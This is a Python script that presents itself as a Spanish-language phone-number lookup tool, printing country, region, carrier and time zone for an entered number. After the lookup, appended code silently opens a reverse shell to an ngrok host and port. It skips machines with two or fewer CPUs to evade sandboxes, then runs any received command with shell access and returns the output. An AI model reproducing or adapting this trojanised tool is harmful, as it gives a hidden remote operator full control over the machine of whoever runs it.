#!/bin/python3

from colorama import Fore
import os

osystem = os.sys.platform

def clear_console():
    if osystem == 'linux':
        os.system('clear')
    else:
        os.system('cls')

def numero():
    numero_telefono = str(input(Fore.GREEN+'Ingresa el numero de telefono:'+Fore.WHITE+' '))
    numero_telefono = numero_telefono.replace(" ", "")
    try:
        import phonenumbers
        from phonenumbers import geocoder, carrier, timezone

        telefono = phonenumbers.parse(numero_telefono)
        international = phonenumbers.format_number(telefono, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        codigo_pais = international.split(' ')[0]
        country = geocoder.country_name_for_number(telefono, 'en')
        localisacion = geocoder.description_for_number(telefono, 'en')
        carrierr = carrier.name_for_number(telefono, 'en')
        print(Fore.YELLOW+f'\n[+] Formato internacional : {international}')
        print(f'[+] Nombre del país    : {country} ({codigo_pais})')
        print(f'[+] Ciudad / Provincia : {localisacion}')
        print(f'[+] Transportador    : {carrierr}')
        for time in timezone.time_zones_for_number(telefono):
                print(f'[+] Zona horaria   : {time}')
                print(Fore.GREEN+'\n[✔] Escaneo completo.')

    except ImportError:
        comand = Fore.GREEN+'pip3 install phonenumbers'
        print(Fore.RED+"!!Modulo phonenumbers no encontrado!!")
        print(f'Utiliza el comando {comand}')


clear_console()
numero()

import os
import socket
import pyautogui
import subprocess

if os.cpu_count() <= 2:
    quit()

HOST = '2.tcp.ngrok.io'
PORT = 12249

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established!"))

while True:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        
        if data == "quit":
            break
        
        if data.startswith("cd "):
            os.chdir(data[3:])
            continue
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value, stderr_value = proc.communicate()
            output_str = stdout_value.decode("cp437") + stderr_value.decode("cp437")
            s.send(str.encode(output_str + os.getcwd() + "> "))
    
    except Exception as e:
        s.send(str.encode("Error occurred: " + str(e) + "\n"))
        continue

s.close()
